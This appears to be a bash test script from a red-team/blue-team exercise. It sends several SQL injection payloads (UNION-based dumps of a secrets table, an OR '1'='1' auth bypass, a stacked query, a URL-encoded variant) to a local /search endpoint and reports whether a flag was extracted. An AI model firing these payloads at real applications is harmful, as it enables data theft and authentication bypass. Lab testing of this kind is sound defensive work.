#!/usr/bin/env bash
# Red team: SQL Injection via /search — try to dump secrets table
# exit 0 = extracted FLAG (RED WINS)
# exit 1 = all SQLi attempts blocked (BLUE WINS)
set -u
TARGET_HOST="${TARGET_HOST:-127.0.0.1}"
TARGET_PORT="${TARGET_PORT:-18080}"
BASE="http://${TARGET_HOST}:${TARGET_PORT}/search"
SUCCESS=1

payloads=(
  # UNION-based: dump secrets table
  "' UNION SELECT id,flag,'x','x' FROM secrets--"
  # same with comment variant
  "' UNION SELECT id,flag,'x','x' FROM secrets/*"
  # boolean-based test
  "admin' OR '1'='1"
  # stacked query (SQLite usually ignores but worth trying)
  "admin'; SELECT flag FROM secrets--"
  # double URL-encode
  "%27%20UNION%20SELECT%20id%2Cflag%2C%27x%27%2C%27x%27%20FROM%20secrets--"
)

echo "---raw---"
for i in "${!payloads[@]}"; do
  p="${payloads[$i]}"
  resp=$(curl -sS --max-time 4 "${BASE}?q=${p}" 2>&1) || true
  if echo "$resp" | grep -qE 'FLAG\{|sql_injection_pwned'; then
    echo "PAYLOAD[$i] SQLI_SUCCESS: ${p:0:80}"
    echo "RESPONSE_SNIPPET: ${resp:0:300}"
    SUCCESS=0
  elif echo "$resp" | grep -qE '"role":"admin"' && echo "$p" | grep -qi "OR"; then
    echo "PAYLOAD[$i] SQLI_BOOLEAN_BYPASS: dumped admin row"
    SUCCESS=0
  else
    echo "PAYLOAD[$i] blocked: ${p:0:80}"
  fi
done
echo "---/raw---"

if [ "$SUCCESS" -eq 0 ]; then
  echo "EVIDENCE: SQL injection succeeded — extracted data from secrets or bypassed auth"
  exit 0
fi
echo "EVIDENCE: all SQL injection attempts blocked"
exit 1
